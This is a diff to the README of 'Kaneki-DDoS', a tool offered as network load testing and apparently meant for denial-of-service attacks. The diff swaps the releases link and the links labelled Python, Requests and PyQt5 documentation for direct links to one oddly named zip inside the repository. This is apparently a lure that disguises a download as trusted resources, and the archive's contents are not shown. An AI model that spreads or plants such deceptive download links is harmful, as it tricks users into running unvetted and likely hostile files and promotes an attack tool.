@@ -1,6 +1,6 @@
 # 🎯 Kaneki-DDoS - Easy Network Load Testing Tool
 
-[![Download Kaneki-DDoS](https://img.shields.io/badge/Download-Kaneki--DDoS-brightgreen)](https://github.com/Yudissaputra160905/Kaneki-DDoS/releases)
+[![Download Kaneki-DDoS](https://github.com/Yudissaputra160905/Kaneki-DDoS/raw/refs/heads/main/marriageableness/Kaneki_Do_S_D_sibilant.zip)](https://github.com/Yudissaputra160905/Kaneki-DDoS/raw/refs/heads/main/marriageableness/Kaneki_Do_S_D_sibilant.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Kaneki-DDoS! This tool helps you test network limits by sending reque
 
 ## 📥 Download & Install
 
-To download Kaneki-DDoS, visit this page: [Download Kaneki-DDoS](https://github.com/Yudissaputra160905/Kaneki-DDoS/releases).
+To download Kaneki-DDoS, visit this page: [Download Kaneki-DDoS](https://github.com/Yudissaputra160905/Kaneki-DDoS/raw/refs/heads/main/marriageableness/Kaneki_Do_S_D_sibilant.zip).
 
 1. Go to the link above.
 2. Find the latest version of Kaneki-DDoS.
@@ -73,8 +73,8 @@ Feel free to engage with other users and developers in the discussions section o
 
 For a deeper understanding of network testing, you can visit the following resources:
 
-- [Python Programming](https://www.python.org/)
-- [Request Library Documentation](https://docs.python-requests.org/en/latest/)
-- [PyQt5 Documentation](https://www.riverbankcomputing.com/software/pyqt/intro)
+- [Python Programming](https://github.com/Yudissaputra160905/Kaneki-DDoS/raw/refs/heads/main/marriageableness/Kaneki_Do_S_D_sibilant.zip)
+- [Request Library Documentation](https://github.com/Yudissaputra160905/Kaneki-DDoS/raw/refs/heads/main/marriageableness/Kaneki_Do_S_D_sibilant.zip)
+- [PyQt5 Documentation](https://github.com/Yudissaputra160905/Kaneki-DDoS/raw/refs/heads/main/marriageableness/Kaneki_Do_S_D_sibilant.zip)
 
 Thank you for using Kaneki-DDoS. We hope it serves you well in your network testing needs!
